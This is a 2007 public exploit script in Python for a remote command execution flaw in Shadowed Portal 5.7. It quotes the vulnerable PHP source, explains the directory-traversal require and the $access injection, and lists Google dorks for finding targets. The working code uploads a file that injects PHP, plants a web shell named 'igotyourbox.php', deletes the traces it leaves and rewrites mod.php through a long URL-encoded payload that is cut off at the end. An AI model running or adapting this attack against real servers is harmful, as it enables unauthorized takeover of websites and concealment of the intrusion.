#!/usr/bin/python
#-*- coding: iso-8859-15 -*-
'''
 ____            __________         __             ____  __
/_   | ____     |__\_____  \  _____/  |_          /_   |/  |_
 |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\
 |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |
 |___|___|  /\__|  /______  /\___  >__|            |___||__|
          \/\______|      \/     \/
------------------------------------------------------------------------------------------------
This is a Public Exploit. 21/12/2007 (dd-mm-yyyy)
------------------------------------------------------------------------------------------------
Â§ Shadowed Portal 5.7 and maybe lower - Remote Command Execution Vulnerabilities Â§
Vendor:	  http://www.shad0wed.com
Severity: Highest
Author:	  The:Paradox

Visit inj3ct-it.org

Proud to be Italian.
------------------------------------------------------------------------------------------------
Related Codes:

-- control.php; line 1:

<?php

require("config.php");

require("globals.php");

require("functions.php");

require("variables.php");

$return = setvar("return");

if($act == "login") {

$online = 0;

$usr = $_POST['usr'];

$pwd = $_POST['pwd'];

if(file_exists($root."/users/".strtolower($usr).".php")) {

require($root."/users/".strtolower($usr).".php");

}

-- globals.php; line 1:

<?php

define('CHECK',md5("null"));

global $viv;

global $mod;

global $act;

global $do;

global $act;

global $id;

global $tp;

global $w;

global $method;

global $board;

global $user;

global $pass;

global $cat;

global $linkback;

global $HTTP_POST_VARS;

global $_GET;

global $_POST;

global $_FILES;

global $HTTP_REFERER;

global $_SERVER;

-- /modules/fs/mod.php; line 1:

<?php

if(!defined('CHECK')) { exit; }

-- /modules/fs/mod.php; line 277:

if($do == "_upload") {

echo <<<HTML

<table width="100%" $sp_table>

<tr $sp_htr><td align="center" $sp_htd>FS: Upload</td></tr>

<tr $sp_ctr><td $sp_ctd>

HTML;

if($ls == $login_session) {

$err = 0;

$id = make_code(50);

$product = alter($_POST['product']);

$publisher = alter($_POST['publisher']);

$category = alter($_POST['category']);

$product_website = alter($_POST['product_website']);

$description = alter($_POST['description']);

$ext = substr(strrchr($_FILES['upload']['name'],"."),1);

if(blankc($_FILES['upload']['name'],"Upload")) { $err = 1; }

if(blankc($product,"Product")) { $err = 1; }

if(blankc($category,"Category")) { $err = 1; }

if(blankc($description,"Description")) { $err = 1; }

if($_FILES['upload']['size'] > FS_MAX_SIZE) { derr("File is too large. Limit: ".$fs_max_size); $err = 1; }

if($fs_ext_allow != "") {

$arr = explode(",",$fs_ext_allow);

$err = 1;

foreach($arr as $single) {

if(strtolower($ext) == strtolower($single)) { $err = 0; }

}

if($err == 1) { derr("File extension ($ext) is not allowed. Extensions allowed are: ".str_replace(",",", ",$fs_ext_allow));  }

}

else {

$arr = explode(",",$fs_ext_unallow);

foreach($arr as $single) {

if(strtolower($ext) == strtolower($single)) { derr("File extension ($single) is not allowed."); $err = 1; }

}

}

if($err == 0) {

if(move_uploaded_file($_FILES['upload']['tmp_name'],$mod_root."/uploads/".$id)) {

$fs_files = "";

require($root."/users/".strtolower($usr).".php");

$fs_files .= "||" . $id;

$name = basename($_FILES['upload']['name']);

$author = $usr;

$date_posted = $date;

$downloads = 0;

$rating = 0;

if($u_rank >= $rank_required['mod_admin']) {

$access = alter($_POST['access']);

}

else {

$access = 0;

}

define('FS_WRITE',"edit");

require($mod_root."/fs_file.php");

wf($mod_root."/files/".$id.".php","w",$fs_file);

require($root."/user_info.php");

wf($root."/users/".strtolower($usr).".php","w",$user_info);

echo <<<HTML

File successfully uploaded.<br />

<div align="center">

(<a href="$mod_url&do=view&id=$id">View File</a>)<br />

(<a href="$mod_url&do=manage">Manage Uploads</a>)<br />

(<a href="$mod_url&do=upload">Upload Another File</a>)<br />

</div>

HTML;

}

else { derr("Failed to upload file."); }

}

}

else { derr("Bad session."); }

echo <<<HTML

</td></tr>

</table>

HTML;

}

------------------------------------------------------------------------------------------------
Bug Explanation:

This Portal presents a vulnerability in the "login system" that allows us to require a page ".php" in the directory "/users/" (whatever using directory transversal ("../") we can require any page).

Additionally "Check" was defined by the required page globals.php, allowing us to bypass the "security-die" on the top of most php page (see /modules/fs/mod.php; line 1).
In this exploit we will require "/modules/fs/mod.php" to be able to upload files.
The uploader is secure but mod.php creates a "description file" of the upload, in this file the $access variabile is not correctly filtered.

Normally that var could be given only by administrators ($u_rank >= $rank_required['mod_admin']) but in our particular case $rank_required['mod_admin'] has no values (Because the "first require trick" has skipped some includes) , and a $variable_with_value is always > $variabile_without_value.

We will insert malicious php code in it, and get command execution. Whatever the "description page" won't be directly accessible, but there is no problem for us: just require it through control.php again =D (To make RCE easier, in the exploit i will create an accessibile php page in the "/" path).
------------------------------------------------------------------------------------------------
The require in control.php is extremely unsafe, it could be used with other pages to obtain other vulnerabilities.
------------------------------------------------------------------------------------------------
Google Dork-> Powered by Shadowed Portal
Google Dork-> These script's code is Copyright 2003-2006 by Shadowed Works.
------------------------------------------------------------------------------------------------
Use this exploit at your own risk. You are responsible for your own deeds.
------------------------------------------------------------------------------------------------
Use your brain, do not lame. Enjoy. =)
'''
#Python exploit starts:

import httplib, urllib, sys
print "\n################################################"
print "      Shadowed Portal 5.7d3 and maybe lower     "
print "        Remote Command Execution Exploit        "
print "                                                "
print "            Discovered By The:Paradox           "
print "                                                "
print " Usage:                                         "
print " python %s [Target] [Path]     	               " % (sys.argv[0])
print "                                                "
print " Example:                                       "
print " python %s 127.0.0.1 /shadowed/                 " % (sys.argv[0])
print " python %s www.host.com /                       " % (sys.argv[0])
print "                                                "
print "                                                "
print "################################################\n"
if len(sys.argv)<=1:	sys.exit()
else:   print "[.]Exploit Starting."
port = "80"
target = sys.argv[1]
try: path = sys.argv[2]
except IndexError: path = "/"

######################################################## Modify only if you know what are you doing.


boundary = '190489618919464387081597939530'
foo = '\r\n'

def contentdef(name, value):
	arr = []
	arr.append('-----------------------------' + boundary)
	arr.append('Content-Disposition: form-data; name="%s"' % name)
	arr.append('')
	arr.append(value)
	arr.append('')
	return foo.join(arr)

def contentdeffile(name, filename, ctype, value):
	arr = []
	arr.append('-----------------------------' + boundary)
	arr.append('Content-Disposition: form-data; name="%s"; filename="%s"' % (name,filename))
	arr.append('Content-Type: ' + ctype)
	arr.append('')
	arr.append(value)
	arr.append('')
	arr.append('-----------------------------' + boundary + '--')
	return foo.join(arr)

postcontent = contentdef("usr","../modules/fs/mod") + contentdef("do","_upload") + contentdef("mod_root","./modules/fs/") + contentdef("pwd","XxX") + contentdef("product","Product") + contentdef("publisher","Publisher") + contentdef("category","Category") + contentdef("product_website","Website") + contentdef("access","-1; eval(stripslashes(getenv(HTTP_REFERER)))") + contentdef("description","Description") + contentdeffile("upload","1.txt","text/plain",".:|31337|:.")
#Some Greetz to nexen for the "Getenv-Eval" idea (we can't use $ char)
#print postcontent

conn = httplib.HTTP(target,port)
conn.putrequest('POST', path + "control.php?act=login")
conn.putheader('Accept', 'text/plain')
conn.putheader('Content-type', 'multipart/form-data; boundary=---------------------------'+ boundary)
conn.putheader('Content-length', str(len(postcontent)))
conn.endheaders()
conn.send(postcontent)
a, b, c = conn.getreply()
print "[.]Connecting... -->",a,b
try:
	response = conn.file.read()
	code = response.split('do=view&id=')[1].split('">')[0]
	#print code
except IndexError:
	sys.exit("[-]Unable to get $id. Some error occured. The server response was:\r\n\r\n" + response)

conn = httplib.HTTPConnection(target,port)
conn.request("POST", path + "control.php?act=login", urllib.urlencode({'usr': '../modules/fs/files/'+ code, 'pwd': 'XxX'}), {"Accept": "text/plain","Content-type": "application/x-www-form-urlencoded","Referer": '$r0x = fopen ("igotyourbox.php", "w+"); fwrite ($r0x, urldecode("%3C%3FPHP+eval(stripslashes(%24_REQUEST%5Bdox%5D))%3B+%3F%3E")); fclose($r0x);die;'})
response = conn.getresponse()
print "[.]Creating the new php page. -->",response.status, response.reason
conn.close()

conn = httplib.HTTPConnection(target,port)
conn.request("GET", path + "igotyourbox.php")
response = conn.getresponse()
print "[.]Verifying existence of created page. -->",response.status, response.reason

if response.status == 404:
	sys.exit("[-]Not found. Exploit Failed.\r\n Maybe we don't have rights to write file in / path.")
else:
	print "[+]Done."

#Removing our traces. =)

conn = httplib.HTTPConnection(target,port)
conn.request("POST", path + "igotyourbox.php", urllib.urlencode({'dox': "unlink('./modules/fs/files/" + code + ".php'); $dir = \"./modules/fs/uploads\"; $handle = opendir($dir); while($file = readdir($handle)) { $loc = $dir.\"/\".$file; if(!is_dir($loc) && eregi(\".:|31337|:.\", file_get_contents($loc))) unlink(\"$loc\"); }"}), {"Accept": "text/plain","Content-type": "application/x-www-form-urlencoded"})
response = conn.getresponse()
print "[+]Removing Our Traces. -->",response.status, response.reason
conn.close()

#'Cause mod.php has been corrupted, we'll repair it.

conn = httplib.HTTPConnection(target,port)
conn.request("POST", path + "igotyourbox.php", urllib.urlencode({'dox': "$r0x = fopen (\"./modules/fs/mod.php\", \"w+\"); fwrite ($r0x, urldecode(\"%3C%3Fphp%0A%0Aif(!defined('CHECK'))+%7B+exit%3B+%7D%0A%0Arequire(%24mod_root.%22%2Fconfig.php%22)%3B%0A%0A%24id+%3D+strip_dir_illegals(%24id)%3B%0A%0Aif((!isset(%24do))+%7C%7C+(%24do+%3D%3D+%22%22))+%7B%0A%0Arequire(%24mod_root.%22%2Fcategories.php%22)%3B%0A%0Aif((!isset(%24cat))+%7C%7C+(%24cat+%3D%3D+%22%22))+%7B%0A%0A%24list+%3D+%24categories%3B%0A%0A%7D%0A%0Aelse+%7B%0A%0A%24list+%3D+%24subcat%5B%22%24cat%22%5D%3B%0A%0A%7D%0A%0A%2F%2F+Count+Files+%2F%2F%0A%0A%24count_incat+%3D+array()%3B%0A%0A%24dir+%3D+%24mod_root.%22%2Ffiles%22%3B%0A%0A%24handle+%3D+opendir(%24dir)%3B%0A%0Awhile(%24file+%3D+readdir(%24handle))+%7B%0A%0A%24loc+%3D+%24dir.%22%2F%22.%24file%3B%0A%0Aif(!is_dir(%24loc))+%7B%0A%0Aif(strrchr(%24file%2C%22.%22)+%3D%3D+%22.php%22)+%7B%0A%0Ainclude(%24loc)%3B%0A%0A%24count_incat%5B%22%24fs_category%22%5D%2B%2B%3B%0A%0A%7D%0A%0A%7D%0A%0A%7D%0A%0A%2F%2F+End+%2F%2F%0A%0Aecho+%22%3Cdiv+align%3D%5C%22right%5C%22%3E%3Ctable+%24sp_table%3E%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%3Ca+href%3D%5C%22%24mod_url%5C%22%3EDownloads%3C%2Fa%3E+%26gt%3B+Browse%3C%2Ftd%3E%3C%2Ftr%3E%3C%2Ftable%3E%3C%2Fdiv%3E%3Cbr+%2F%3E%22%3B%0A%0Aif(%24list+!%3D+%22%22)+%7B%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3Ctable+width%3D%22100%25%22+%24sp_table%3E%0A%0A%3Ctr+%24sp_htr%3E%3Ctd+%24sp_htd%3ECategories%3C%2Ftd%3E%3C%2Ftr%3E%0A%0AHTML%3B%0A%0A%24arr+%3D+explode(%22%7C%7C%22%2C%24list)%3B%0A%0Anatcasesort(%24arr)%3B%0A%0Aforeach(%24arr+as+%24single)+%7B%0A%0Aif(%24single+!%3D+%22%22)+%7B%0A%0A%24arrx+%3D+explode(%22%26%26%22%2C%24single)%3B%0A%0A%24desc+%3D+%24cat_description%5B%22%24arrx%5B1%5D%22%5D%3B%0A%0A%24inner_count+%3D+count(explode(%22%7C%7C%22%2C%24subcat%5B%22%24arrx%5B1%5D%22%5D))+-+1%3B%0A%0A%24inner_out+%3D+%22%22%3B%0A%0Aif(%24inner_count+%3C%3D+0)+%7B+%24inner_count+%3D+0%3B+%7D%0A%0Aelse+%7B%0A%0A%24inner_out+%3D+%22%7C%7C+%3Cb%3ESub+Categories%3A%3C%2Fb%3E+%24inner_count%3C%2Fi%3E%22%3B%0A%0A%7D%0A%0A%24incat+%3D+%24count_incat%5B%22%24arrx%5B1%5D%22%5D%3B%0A%0Aif(%24incat+%3D%3D+%22%22)+%7B+%24incat+%3D+0%3B+%7D%0A%0Aif(%24desc+!%3D+%22%22)+%7B+%24desc+%3D+%24desc.%22%3Cbr+%2F%3E%22%3B+%7D%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%3Cb%3E%3Ca+href%3D%22%24mod_url%26cat%3D%24arrx%5B1%5D%22%3E%24arrx%5B0%5D%3C%2Fa%3E%3C%2Fb%3E%3Cbr+%2F%3E%0A%0A%24desc%0A%0A%3Cb%3EFiles%3A%3C%2Fb%3E+%24incat+%24inner_out%0A%0A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0AHTML%3B%0A%0A%7D%0A%0A%7D%0A%0Aecho+%22%3C%2Ftable%3E%3Cbr+%2F%3E%22%3B%0A%0A%7D%0A%0A%24out_files+%3D+%22%22%3B%0A%0A%24count_files+%3D+0%3B%0A%0A%24dir+%3D+%24mod_root.%22%2Ffiles%22%3B%0A%0A%24handle+%3D+opendir(%24dir)%3B%0A%0Awhile(%24file+%3D+readdir(%24handle))+%7B%0A%0A%24loc+%3D+%24dir.%22%2F%22.%24file%3B%0A%0Aif(!is_dir(%24loc))+%7B%0A%0Aif(strtolower(strrchr(%24file%2C%22.%22))+%3D%3D+%22.php%22)+%7B%0A%0Arequire(%24loc)%3B%0A%0A%24count_files%2B%2B%3B%0A%0Aif(%24fs_category+%3D%3D+%24cat)+%7B%0A%0A%24name+%3D+str_replace(%22.php%22%2C%22%22%2C%24file)%3B%0A%0A%24f_size+%3D+filesize(%24mod_root.%22%2Fuploads%2F%22.%24name)%3B%0A%0A%24out_website+%3D+%22(none)%22%3B%0A%0Aif(%24fs_website+!%3D+%22%22)+%7B%0A%0Aif(strpos(%24fs_website%2C%22%2F%22)+%3D%3D+false)+%7B+%24fs_website+%3D+%22http%3A%2F%2F%22+.+%24fs_website%3B+%7D%0A%0A%24out_website+%3D+%22%3Ca+href%3D%5C%22%24fs_website%5C%22%3EVisit%3C%2Fa%3E%22%3B%0A%0A%7D%0A%0A%24desc+%3D+add_spcode(%24fs_description)%3B%0A%0A%24out_files+.%3D+%3C%3C%3CHTML%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%3Cb%3E%3Ca+href%3D%22%24mod_url%26do%3Dview%26id%3D%24name%22%3E%24fs_product%3C%2Fa%3E%3C%2Fb%3E%3Cbr+%2F%3E%0A%0A%24desc%3Cbr+%2F%3E%0A%0A%3Cb%3ESize%3A%3C%2Fb%3E+%24f_size+%7C%7C+%3Cb%3EPublisher%3A%3C%2Fb%3E+%24fs_publisher+%7C%7C+%3Cb%3EWebsite%3A%3C%2Fb%3E+%24out_website%3Cbr+%2F%3E%0A%0A%3Cb%3EDate+Posted%3A%3C%2Fb%3E+%24fs_date+%7C%7C+%3Cb%3EDownloads%3A%3C%2Fb%3E+%24fs_downloads+%7C%7C+%3Cb%3ERating%3A%3C%2Fb%3E+%24fs_rating%0A%0A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0AHTML%3B%0A%0A%7D%0A%0A%7D%0A%0A%7D%0A%0A%7D%0A%0Aif((isset(%24cat))+%7C%7C+(%24cat+!%3D+%22%22))+%7B%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3Ctable+width%3D%22100%25%22+%24sp_table%3E%0A%0A%3Ctr+%24sp_htr%3E%3Ctd+%24sp_htd%3EFiles%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%24out_files%0A%0A%3C%2Ftable%3E%3Cbr+%2F%3E%0A%0AHTML%3B%0A%0A%7D%0A%0Aecho+%22%3Cdiv+align%3D%5C%22center%5C%22%3EThere+are+%24count_files+files+in+the+database.%3C%2Fdiv%3E%3Cbr+%2F%3E%22%3B%0A%0A%7D%0A%0Aif(%24do+%3D%3D+%22do_dl%22)+%7B+echo+%24_SERVER%5B'HTTP_REFERER'%5D.%22%3A%22%3B+%7D%0A%0Aif(%24do+%3D%3D+%22dl%22)+%7B%0A%0Aif(strpos(%24_SERVER%5B'HTTP_REFERER'%5D%2C%24url)+!%3D%3D+false)+%7B%0A%0Aif(%24u_rank+%3E%3D+%24rank_required%5B'mod_download'%5D)+%7B%0A%0Aif(file_exists(%24mod_root.%22%2Ffiles%2F%22.%24id.%22.php%22))+%7B%0A%0Ainclude(%24mod_root.%22%2Ffiles%2F%22.%24id.%22.php%22)%3B%0A%0Aif(%24u_rank+%3E%3D+%24fs_access)+%7B%0A%0A%24f_size+%3D+filesize(%24mod_root.%22%2Fuploads%2F%22.%24id)%3B%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3Cdiv+align%3D%22right%22%3E%3Ca+href%3D%22%24mod_url%22%3EDownloads%3C%2Fa%3E+%26gt%3B+%24fs_product+%26gt%3B+Download+Now%3C%2Fdiv%3E%3Cbr+%2F%3E%0A%0A%3Cspan+class%3D%22title%22%3E%24fs_product%3C%2Fspan%3E%3Cbr+%2F%3E%0A%0A%3Cbr+%2F%3E%0A%0A%3Ctable+width%3D%22100%25%22+%24sp_table%3E%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%0A%0A%3Ctable+border%3D%220%22+cellspacing%3D%224%22+cellpadding%3D%220%22%3E%0A%0A%3Ctr%3E%3Ctd+width%3D%22150%22%3EFile+Name%3A%3C%2Ftd%3E%3Ctd%3E%24fs_product%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3EPublisher%3A%3C%2Ftd%3E%3Ctd%3E%24fs_publisher%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3EFile+Size%3A%3C%2Ftd%3E%3Ctd%3E%24f_size%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3C%2Ftable%3E%3Cbr+%2F%3E%0A%0A%3Cspan+id%3D%22dl%22%3EYou+are+now+downloading+%24fs_product.+Your+download+will+begin+is+%3Cspan+id%3D%22count%22+style%3D%22font-weight%3A+bold%3B%22%3E%24fs_count_down%3C%2Fspan%3E+seconds.%3Cbr+%2F%3E%3C%2Fspan%3E%0A%0A%3Cscript+language%3D%22JavaScript%22%3E%0A%0A%3C!--%0A%0Avar+countDown+%3D+%24fs_count_down%3B%0A%0Afunction+timer()+%7B%0A%0AcountDown--%3B%0A%0Adocument.getElementById('count').innerHTML+%3D+countDown%3B%0A%0Aif(countDown+%3D%3D+0)+%7B%0A%0A%2F%2Flocation.replace(%22%24mod_url%26do%3Ddl_go%26id%3D%24id%22)%3B%0A%0Adocument.getElementById('dl').innerHTML+%3D+%22%3Cb%3E%3Ca+href%3D'%24mod_url%26do%3Ddl_go%26id%3D%24id'%3EBegin+Download%3C%2Fa%3E%3C%2Fb%3E%3Cbr+%2F%3E%22%3B%0A%0A%7D%0A%0Aelse+%7B%0A%0AsetTimeout(%22timer()%3B%22%2C1000)%3B%0A%0A%7D%0A%0A%7D%0A%0Atimer()%3B%0A%0A--%3E%0A%0A%3C%2Fscript%3E%0A%0A%3Cnoscript%3E%0A%0A%3Cbr+%2F%3E%0A%0AJavaScript+is+not+enabled.+Please+click+the+following+link%3A%3Cbr+%2F%3E%0A%0A%3Ca+href%3D%22%24mod_url%26do%3Ddo_dl%26id%3D%24id%22%3EDownload%3C%2Fa%3E%3Cbr+%2F%3E%0A%0A%3C%2Fnoscript%3E%0A%0A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3C%2Ftable%3E%0A%0AHTML%3B%0A%0A%7D%0A%0Aelse+%7B%0A%0Aif((%24fs_access+%3D%3D+0)+%26%26+(%24online+%3D%3D+0))+%7B%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3Ctable+width%3D%22100%25%22+%24sp_table%3E%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%0A%0AYou+must+be+logged+in+to+download+this+file.+Please+login.%0A%0A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3C%2Ftable%3E%3Cbr+%2F%3E%0A%0AHTML%3B%0A%0A%24viv+%3D+%22Login%22%3B%0A%0A%7D%0A%0Aelse+%7B+%24viv+%3D+%22Not_Enough_Access%22%3B+%7D%0A%0A%7D%0A%0A%7D%0A%0A%7D%0A%0Aelse+%7B%0A%0Aif((%24rank_required%5B'mod_download'%5D+%3D%3D+0)+%26%26+(%24online+%3D%3D+0))+%7B%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3Ctable+width%3D%22100%25%22+%24sp_table%3E%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%0A%0AYou+must+be+logged+in+to+download+this+file.+Please+login.%0A%0A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3C%2Ftable%3E%3Cbr+%2F%3E%0A%0AHTML%3B%0A%0A%24viv+%3D+%22Login%22%3B%0A%0A%7D%0A%0Aelse+%7B+%24viv+%3D+%22Not_Enough_Access%22%3B+%7D%0A%0A%7D%0A%0A%7D%0A%0Aelse+%7B+derr(%22This+page+cannot+be+accessed+remotely.%22)%3B+%7D%0A%0A%7D%0A%0Aif(%24do+%3D%3D+%22view%22)+%7B%0A%0Aif(file_exists(%24mod_root.%22%2Ffiles%2F%22.%24id.%22.php%22))+%7B%0A%0Ainclude(%24mod_root.%22%2Ffiles%2F%22.%24id.%22.php%22)%3B%0A%0A%24f_size+%3D+filesize(%24mod_root.%22%2Fuploads%2F%22.%24id)%3B%0A%0A%24desc+%3D+add_vxcode(%24fs_description%2C0)%3B%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3Cdiv+align%3D%22right%22%3E%3Ca+href%3D%22%24mod_url%22%3EDownloads%3C%2Fa%3E+%26gt%3B+%24fs_product%3C%2Fdiv%3E%3Cbr+%2F%3E%0A%0A%3Cspan+class%3D%22title%22%3E%24fs_product%3C%2Fspan%3E%3Cbr+%2F%3E%3Cbr+%2F%3E%0A%0A%3Ctable+width%3D%22100%25%22+border%3D%220%22+cellspacing%3D%224%22+cellpadding%3D%220%22%3E%0A%0A%3Ctr+valign%3D%22top%22%3E%3Ctd+width%3D%2230%25%22%3E%0A%0A%3Ca+href%3D%22%24mod_url%26do%3Ddl%26id%3D%24id%22%3E%3Cimg+src%3D%22%24url%2Fmodules%2F%24mod%2Fimages%2Fdownload.gif%22+border%3D%220%22+alt%3D%22Download%22+%2F%3E%3C%2Fa%3E%0A%0A%3C%2Ftd%3E%3Ctd+width%3D%2270%25%22%3E%0A%0A%3Ctable+width%3D%22100%25%22+%24sp_table%3E%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%3Cb%3EFile%3C%2Fb%3E%3C%2Ftd%3E%3Ctd+%24sp_ctd%3E%24fs_name%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%3Cb%3ESize%3C%2Fb%3E%3C%2Ftd%3E%3Ctd+%24sp_ctd%3E%24f_size%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%3Cb%3EPublisher%3C%2Fb%3E%3C%2Ftd%3E%3Ctd+%24sp_ctd%3E%3Ca+href%3D%22%24fs_website%22%3E%24fs_publisher%3C%2Fa%3E%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%3Cb%3EUploaded+By%3C%2Fb%3E%3C%2Ftd%3E%3Ctd+%24sp_ctd%3E%24fs_author%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%3Cb%3EDate+Posted%3C%2Fb%3E%3C%2Ftd%3E%3Ctd+%24sp_ctd%3E%24fs_date%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%3Cb%3EDownloads%3C%2Fb%3E%3C%2Ftd%3E%3Ctd+%24sp_ctd%3E%24fs_downloads%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%3Cb%3ERating%3C%2Fb%3E%3C%2Ftd%3E%3Ctd+%24sp_ctd%3E%24fs_rating%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3C%2Ftable%3E%0A%0A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3C%2Ftable%3E%0A%0A%3Chr+%2F%3E%0A%0A%3Ctable+width%3D%22100%25%22+%24sp_table%3E%0A%0A%3Ctr+%24sp_htr%3E%3Ctd+%24sp_htd%3EDescription%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%0A%0A%24desc%0A%0A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3C%2Ftable%3E%0A%0AHTML%3B%0A%0A%7D%0A%0Aelse+%7B+derr(%22File+not+found.%22)%3B+%7D%0A%0A%7D%0A%0Aif(%24u_rank+%3E%3D+%24rank_required%5B'mod_account'%5D)+%7B%0A%0Aif(%24do+%3D%3D+%22upload%22)+%7B%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3Ctable+width%3D%22100%25%22+%24sp_table%3E%0A%0A%3Ctr+%24sp_htr%3E%3Ctd+align%3D%22center%22+%24sp_htd%3EFS%3A+Upload%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr+%24sp_ctr%3E%3Ctd+%24sp_ctd%3E%0A%0A%3Cform+action%3D%22%24mod_url%26do%3D_upload%26ls%3D%24login_session%22+method%3D%22POST%22+enctype%3D%22multipart%2Fform-data%22%3E%0A%0A%3Cfieldset%3E%0A%0A%3Clegend%3EFile%3C%2Flegend%3E%0A%0A%3Ctable+cellspacing%3D%224%22+cellpadding%3D%220%22+border%3D%220%22%3E+%0A%0A%3Ctr%3E%3Ctd%3ELocation%3A%3C%2Ftd%3E%3Ctd%3E%3Cinput+type%3D%22file%22+name%3D%22upload%22+size%3D%2250%22+%2F%3E%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3C%2Ftable%3E%0A%0A%3C%2Ffieldset%3E%3Cbr+%2F%3E%0A%0A%3Cfieldset%3E%0A%0A%3Clegend%3EInformation%3C%2Flegend%3E%0A%0A%3Ctable+cellspacing%3D%224%22+cellpadding%3D%220%22+border%3D%220%22%3E+%0A%0A%3Ctr%3E%3Ctd%3EProduct%3A%3C%2Ftd%3E%3Ctd%3E%3Cinput+type%3D%22text%22+name%3D%22product%22+size%3D%2250%22+%2F%3E%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3EPublisher%3A%3C%2Ftd%3E%3Ctd%3E%3Cinput+type%3D%22text%22+name%3D%22publisher%22+size%3D%2250%22+%2F%3E%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3ECategory%3A%3C%2Ftd%3E%3Ctd%3E%0A%0A%3Cselect+name%3D%22category%22+%2F%3E%0A%0AHTML%3B%0A%0A%24categories+%3D+%22%22%3B%0A%0A%24out+%3D+array()%3B%0A%0Arequire(%24mod_root.%22%2Fcategories.php%22)%3B%0A%0Aunset(%24names)%3B%0A%0Awhile(%24categories+!%3D+%22%22)+%7B%0A%0A%24sub+%3D+array()%3B%0A%0A%24arr+%3D+explode(%22%7C%7C%22%2C%24categories)%3B%0A%0Aforeach(%24arr+as+%24single)+%7B%0A%0Aif(%24single+!%3D+%22%22)+%7B%0A%0A%24arrx+%3D+explode(%22%26%26%22%2C%24single)%3B%0A%0Aarray_push(%24out%2C%22%3C!--+%24arrx%5B0%5D+--%3E%3Coption+value%3D%5C%22%24arrx%5B1%5D%5C%22%3E%24arrx%5B0%5D%3C%2Foption%3E%5Cn%22)%3B%0A%0Aarray_push(%24sub%2C%24arrx%5B1%5D)%3B%0A%0A%24names%5B%22%24arrx%5B1%5D%22%5D+%3D+%24arrx%5B0%5D%3B%0A%0A%7D%0A%0A%7D%0A%0A%24categories+%3D+%22%22%3B%0A%0Aforeach(%24sub+as+%24single)+%7B%0A%0A%24categories+.%3D+str_replace(%22%7C%7C%22%2C%22%7C%7C%22.%24names%5B%22%24single%22%5D.%22+%2F+%22%2C%24subcat%5B%22%24single%22%5D)%3B%0A%0A%7D%0A%0A%7D%0A%0Anatcasesort(%24out)%3B%0A%0Aforeach(%24out+as+%24single)+%7B%0A%0Aecho+%24single%3B%0A%0A%7D%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3C%2Fselect%3E%0A%0A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd%3EWebsite%3A%3C%2Ftd%3E%3Ctd%3E%3Cinput+type%3D%22text%22+name%3D%22product_website%22+size%3D%2250%22+%2F%3E%3C%2Ftd%3E%3C%2Ftr%3E%0A%0AHTML%3B%0A%0Aif(%24u_rank+%3E%3D+%24rank_required%5B'mod_admin'%5D)+%7B%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3Ctr%3E%3Ctd%3EAccess+to+Download%3Cbr+%2F%3E(Besides+Default)%3A%3C%2Ftd%3E%3Ctd%3E%3Cinput+type%3D%22text%22+name%3D%22access%22+value%3D%22-1%22+size%3D%222%22+%2F%3E%3C%2Ftd%3E%3C%2Ftr%3E%0A%0AHTML%3B%0A%0A%7D%0A%0Aecho+%3C%3C%3CHTML%0A%0A%3Ctr%3E%3Ctd+colspan%3D%222%22%3EDescription%3A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3Ctr%3E%3Ctd+colspan%3D%222%22%3E%0A%0A%3Ctextarea+name%3D%22description%22+cols%3D%2270%22+rows%3D%2210%22%3E%3C%2Ftextarea%3E%0A%0A%3C%2Ftd%3E%3C%2Ftr%3E%0A%0A%3C%2Ftable%3E%0A%0A%3C%2Ffieldset%